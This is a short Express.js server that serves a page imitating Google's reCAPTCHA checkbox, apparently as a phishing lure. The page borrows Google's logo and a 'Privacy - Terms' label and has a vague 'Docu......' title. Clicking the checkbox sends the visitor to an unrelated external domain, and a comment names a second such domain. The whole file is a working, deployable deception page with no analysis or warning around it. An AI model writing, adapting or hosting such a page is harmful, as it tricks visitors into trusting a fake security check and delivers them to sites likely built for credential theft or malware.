const express = require('express');
const app = express();
const port = 3020;

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Docu......</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        .recaptcha-container {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            background-color: #f9f9f9;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #ddd;
            background-color: #fff;
            margin-right: 10px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            position: relative;
        }

        .recaptcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
        }

        .recaptcha-checkbox::after {
            content: '✓';
            color: #fff;
            font-size: 14px;
            opacity: 0;
            transform: scale(0);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .recaptcha-checkbox.checked::after {
            opacity: 1;
            transform: scale(1);
        }

        .recaptcha-text {
            font-size: 14px;
            color: #555;
        }

        .recaptcha-logo {
            margin-left: auto;
            font-size: 12px;
            color: #777;
            display: flex;
            align-items: center;
        }

        .recaptcha-logo img {
            width: 18px;
            height: 18px;
            margin-right: 5px;
        }

        .tooltip {
            display: none;
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: #fff;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            white-space: nowrap;
            margin-bottom: 10px;
        }

        .recaptcha-container:hover .tooltip {
            display: block;
        }

        .recaptchasub {
            display: flex;
            justify-items: center;
            flex-direction: column;
            align-items: center;
            background-color: transparent;
            width: 90px;
            height: 74px;
            margin-top: 15px;
            margin-left: auto;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="recaptcha-container">
        <div class="tooltip">Click to verify</div>
        <div class="recaptcha-checkbox" onclick="toggleCheck(this)"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptchasub">
            <img style="width: 30px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span style="font-size: 0.8rem;">reCAPTCHA</span>
            <span style="font-size: 0.6rem;">Privacy - Terms</span>
        </div>
    </div>

    <script>
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(window.location.search);
            return results === null ? null : decodeURIComponent(results[1].replace(/\\+/g, ' '));
        }

        // #https://digitalglamourfo.com.de/iS5t/

        function toggleCheck(element) {
            element.classList.toggle('checked');
            window.location.href = 'https://sanjeevanifood.in/9c7a1f2e-8a61-4c8b-9c88-ef28b9b3ae1d/'
        }
    </script>
</body>

</html>
    `);
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
